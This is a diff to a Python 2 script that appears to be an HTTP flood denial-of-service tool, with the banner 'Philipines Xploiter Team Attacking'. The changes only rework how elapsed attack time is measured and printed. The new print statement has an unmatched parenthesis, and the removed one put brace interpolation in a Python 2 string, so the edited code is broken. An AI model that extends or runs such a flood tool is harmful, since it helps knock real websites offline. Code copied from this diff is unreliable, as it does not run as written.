@@ -10,7 +10,8 @@ import sys
 import threading
 import random
 import re
-from time import time
+import time
+start_time = time.time()
 
 #global params
 url=''
@@ -20,7 +21,6 @@ headers_referers=[]
 request_counter=0
 flag=0
 safe=0
-start = time()
 
 def inc_counter():
 	global request_counter
@@ -97,7 +97,7 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
-			print 'Philipines Xploiter Team Attacking Time taken to run: {time() - start} seconds '
+			print 'Philipines Xploiter Team Attacking --- %s seconds ---' % (time.time() - start_time))
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
